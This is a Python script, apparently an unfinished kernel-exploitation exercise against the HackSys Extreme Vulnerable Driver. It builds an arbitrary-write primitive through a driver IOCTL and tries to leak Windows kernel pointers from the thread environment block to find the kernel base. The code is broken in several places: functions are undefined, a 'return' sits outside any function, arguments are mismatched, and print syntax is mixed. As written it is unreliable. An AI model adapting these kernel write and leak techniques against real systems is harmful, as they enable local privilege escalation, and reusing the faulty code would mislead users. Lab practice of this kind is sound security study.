import ctypes, struct, sys, os, time, platform
from ctypes import *
from ctypes.wintypes import *

#easy definitions to save characters
ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32 

GENERIC_READ				= 0x80000000
GENERIC_WRITE				= 0x40000000
OPEN_EXISTING				= 0x03
FORMAT_MESSAGE_FROM_SYSTEM	= 0x00001000
NULL						= 0x00
STATUS_SUCCESS				= 0x00
MOVEFILE_REPLACE_EXISTING	= 0x01
CREATE_SUSPENDED			= 0x00000004
THREADFUNC					= CFUNCTYPE(None)
MEM_COMMIT					= 0x00001000
MEM_RESERVE					= 0x00002000
PAGE_EXECUTE_READWRITE		= 0x00000040
PAGE_READWRITE				= 0x00000004
ThreadBasicInformation		= 0x00

#We need this definition so the Python script knows what to ask the C/Windows TBI block for.
class THREAD_BASIC_INFORMATION(Structure):
    _fields_ = [
        ("ExitStatus",      c_ulonglong),
        ("TebBaseAddress",  c_void_p),
        ("ClientId",        c_ulonglong),
        ("AffinityMask",    POINTER(c_ulonglong)),
        ("Priority",        c_ulonglong),
        ("BasePriority",    c_ulonglong),
]

#Windows API Function Defs + Extras
ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]
kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong, c_char_p, c_ulonglong, POINTER(c_ulonglong)]
kernel32.DeviceIoControl.argtypes = [c_void_p, c_ulong, c_void_p, c_ulong, c_void_p, c_ulong, POINTER(c_ulong),c_void_p]
#Added more definitions - read memory and also an API call for process information
kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, POINTER(c_size_t)]
ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong, c_void_p, c_ulong, POINTER(c_ulonglong)]
STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

# Allocate memory to use for the HEVD Leak
# Easy to recognize arbitrary address
baseadd = c_ulonglong(0x000000001a000000) 
# Some size
addsize = c_ulonglong(0x3000) 
# The win32con may be fucked up, but I saw this in another exploit's source code using this same library I think it's ok.
dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
# If not zero (True), something didn't work.
if dwStatus != STATUS_SUCCESS:
    print("Something went wrong while allocating memory","e")
    sys.exit()

def writeQWORD(driver, what=None, where=None):
    what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
    # Write the what value to what_addr
    data = struct.pack("<Q", what)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
    
    if dwStatus == 0:
        print("Something went wrong while writing to memory","e")
        sys.exit()

    # Pack the address of the what value and the where address
    data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
    if dwStatus == 0:
        print("Something went wrong while writing to memory in the packing section","e")
        sys.exit()
    

    #IOCTL
    IoControlCode = 0x0022200B
    #Where
    InputBuffer = c_void_p(0x000000001a000000)
    # I THINK this should work? 
    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
    # If our buffer length is zero can't we set OutputBuffer to None?
    OutputBuffer = c_void_p(0x0)
    # The OutputBufferLength is already set to zero. I think we can get rid of this?
    OutputBufferLength = 0x0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
    return triggerIOCTL

ThreadHandle = kernel32.GetCurrentThread()
ThreadInformation = THREAD_BASIC_INFORMATION()
ThreadInformationClass = ThreadBasicInformation
ThreadInformationLength = sizeof(ThreadInformation)
ReturnLength = c_ulonglong(0)

dwStatus = ntdll.NtQueryInformationThread(ThreadHandle, ThreadInformationClass, byref(ThreadInformation), ThreadInformationLength, byref(ReturnLength))
if dwStatus != STATUS_SUCCESS:
	print("Something went wrong","e")
	sys.exit()

teb = ThreadInformation.TebBaseAddress
Win32ThreadInfo = teb + 0x78
W32THREADNONPAGED = leakQWORD(Win32ThreadInfo, driver)
W32THREAD = leakQWORD(W32THREADNONPAGED.value, driver)
nt_EmpCheckErrataList = leakQWORD(W32THREAD.value + 0x2a8, driver)
baseAddr = 0
signature = 0x00905a4d
searchAddr = nt_EmpCheckErrataList.value & 0xFFFFFFFFFFFFF000

while True: 
	readData = writeQWORD(searchAddr, driver)
	tmp = readData.value & 0xFFFFFFFF
	if tmp == signature: 
		baseAddr = searchAddr
		break
	searchAddr = searchAddr - 0x1000

	print "TEB address is: 0x%x" % teb
	print "Win32ThreadInfo address is: 0x%x" % Win32ThreadInfo
	print "W32THREADNONPAGED address is: 0x%x" % W32THREADNONPAGED.value
	print "W32THREAD address is: 0x%x" % W32THREAD.value
	print "nt!EmpCheckErrataList address is: 0x%x" % nt_EmpCheckErrataList.value
	return baseAddr



# Exploit the driver
def executeOverwrite():
    driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),0, None, 0x3, 0, None)
    if not driver_handle or driver_handle == -1:
        print "[!] Driver handle not found :(\n"
        sys.exit()
    else:
        print "[X] Got handle to the driver.\n"
        writeQWORD(driver_handle, 0x4142434445464748, 0x000000001a002000)

        
executeOverwrite()
